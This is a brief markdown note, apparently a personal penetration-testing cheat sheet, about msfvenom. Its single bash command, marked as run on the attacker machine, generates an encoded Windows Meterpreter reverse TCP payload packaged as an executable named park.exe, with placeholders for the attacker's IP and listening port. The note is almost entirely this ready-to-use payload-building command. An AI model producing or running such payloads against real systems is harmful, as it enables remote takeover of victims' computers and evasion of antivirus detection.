## Notes about msfvenom 

```bash
#in attacker machine
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=[ip_localAttackerMachine] LPORT=[listaining_port] -f exe -o park.exe
#generate payload

```